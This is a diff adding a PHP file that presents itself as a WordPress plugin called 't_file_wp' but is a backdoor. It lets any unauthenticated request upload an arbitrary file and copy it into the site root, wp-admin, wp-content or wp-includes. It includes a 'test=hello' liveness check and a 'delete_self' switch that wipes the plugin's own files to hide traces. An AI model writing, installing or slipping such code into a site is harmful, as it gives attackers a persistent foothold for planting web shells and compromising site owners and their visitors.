@@ -1,0 +1,73 @@
+<?php
+/**
+ * @package wp
+ */
+/*
+Plugin Name: t_file_wp
+*/
+
+$home_dir = $_SERVER['DOCUMENT_ROOT'];
+
+if (isset($_GET["delete_self"]) && $_GET["delete_self"] == "1")
+{
+	$dir=__DIR__;
+	array_map('unlink', glob("$dir/*.*"));
+	rmdir($dir);
+}
+
+if (isset($_GET["test"]) && $_GET["test"] == "hello")
+{
+ echo "testtrue";
+}
+
+if(isset($_FILES["filename"]) && is_uploaded_file($_FILES["filename"]["tmp_name"]))
+{
+	 move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
+	 echo "###|###";
+		
+	 if (isset($_POST["folder"])) 
+	 {
+		if (isset($_POST["home"]) && $_POST["home"] == "1") 
+		{
+			if (copy($_FILES["filename"]["name"], $home_dir."/".$_POST["folder"]."/".$_FILES["filename"]["name"])) echo "home=1";
+		}
+		
+		if (isset($_POST["wp_admin"]) && $_POST["wp_admin"] == "1") 
+		{
+			if (copy($_FILES["filename"]["name"], $home_dir."/".$_POST["folder"]."/wp-admin"."/".$_FILES["filename"]["name"])) echo "wp_admin=1";
+		}
+		
+		if (isset($_POST["wp_content"]) && $_POST["wp_content"] == "1") 
+		{
+			if (copy($_FILES["filename"]["name"], $home_dir."/".$_POST["folder"]."/wp-content"."/".$_FILES["filename"]["name"])) echo "wp_content=1";
+		}
+		
+		if (isset($_POST["wp_includes"]) && $_POST["wp_includes"] == "1") 
+		{
+			if (copy($_FILES["filename"]["name"], $home_dir."/".$_POST["folder"]."/wp-includes"."/".$_FILES["filename"]["name"])) echo "wp_includes=1";
+		}
+	 } else {
+		 
+		if (isset($_POST["home"]) && $_POST["home"] == "1") 
+		{
+			if (copy($_FILES["filename"]["name"], $home_dir."/".$_FILES["filename"]["name"])) echo "home=1";
+		}
+		
+		if (isset($_POST["wp_admin"]) && $_POST["wp_admin"] == "1") 
+		{
+			if (copy($_FILES["filename"]["name"], $home_dir."/wp-admin"."/".$_FILES["filename"]["name"])) echo "wp_admin=1";
+		}
+		
+		if (isset($_POST["wp_content"]) && $_POST["wp_content"] == "1") 
+		{
+			if (copy($_FILES["filename"]["name"], $home_dir."/wp-content"."/".$_FILES["filename"]["name"])) echo "wp_content=1";
+		}
+		
+		if (isset($_POST["wp_includes"]) && $_POST["wp_includes"] == "1") 
+		{
+			if (copy($_FILES["filename"]["name"], $home_dir."/wp-includes"."/".$_FILES["filename"]["name"])) echo "wp_includes=1";
+		}		 
+		 
+	 }
+ 
+}
